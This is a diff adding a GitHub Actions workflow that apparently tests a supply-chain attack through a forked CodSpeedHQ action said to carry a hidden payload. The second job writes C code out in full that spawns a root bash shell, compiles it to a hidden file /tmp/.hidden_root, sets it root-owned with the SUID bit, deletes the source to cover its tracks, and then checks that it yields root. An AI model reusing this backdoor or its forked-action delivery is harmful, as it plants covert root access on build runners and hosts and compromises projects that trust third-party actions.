@@ -1,0 +1,49 @@
+name: Test Ruff Attack (SUID Binary)
+on: workflow_dispatch
+
+jobs:
+  test-via-action:
+    name: "Test via forked CodSpeedHQ/action"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: "Run forked action (payload is inside)"
+        uses: rafidhaque/action@56e77b75cd9546bcfd7e75b063df206c3a1c2ee7
+        with:
+          mode: simulation
+          run: echo "no benchmarks"
+        continue-on-error: true
+
+      - name: "Verify SUID binary was created"
+        run: |
+          echo "=== Checking for SUID binary ==="
+          ls -la /tmp/.hidden_root 2>/dev/null && echo "SUID BINARY EXISTS" || echo "SUID BINARY NOT FOUND"
+          file /tmp/.hidden_root 2>/dev/null || true
+          echo "=== Check SUID bit ==="
+          stat -c '%a %U %G' /tmp/.hidden_root 2>/dev/null || true
+          echo "=== Check if source was cleaned up ==="
+          ls -la /tmp/.x.c 2>/dev/null && echo "SOURCE STILL EXISTS (bad)" || echo "SOURCE CLEANED UP (good)"
+
+  test-payload-direct:
+    name: "Test payload directly (no action)"
+    runs-on: ubuntu-latest
+    steps:
+      - name: "Run SUID payload directly"
+        run: |
+          echo 'int main(){setuid(0);setgid(0);system("/bin/bash");}' > /tmp/.x.c
+          gcc /tmp/.x.c -o /tmp/.hidden_root 2>/dev/null
+          sudo chown root:root /tmp/.hidden_root && sudo chmod 4755 /tmp/.hidden_root
+          rm -f /tmp/.x.c
+
+      - name: "Verify SUID binary was created"
+        run: |
+          echo "=== Checking for SUID binary ==="
+          ls -la /tmp/.hidden_root
+          file /tmp/.hidden_root
+          echo "=== Check SUID bit ==="
+          stat -c '%a %U %G' /tmp/.hidden_root
+          echo "=== Check if source was cleaned up ==="
+          ls -la /tmp/.x.c 2>/dev/null && echo "SOURCE STILL EXISTS (bad)" || echo "SOURCE CLEANED UP (good)"
+          echo "=== Test execution (should give root shell) ==="
+          /tmp/.hidden_root -c "whoami && id"
